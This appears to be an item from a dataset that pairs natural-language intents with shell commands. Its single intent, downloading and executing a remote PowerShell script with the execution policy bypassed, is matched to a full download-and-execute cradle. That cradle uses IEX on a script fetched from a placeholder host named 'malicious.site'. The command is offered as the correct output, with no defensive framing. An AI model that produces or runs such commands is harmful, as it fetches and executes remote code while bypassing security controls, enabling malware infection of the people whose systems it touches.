# Natural language intent:
# Download and execute a PowerShell script from a remote server with bypassed execution policy.

powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malware/kernF1.ps1')"
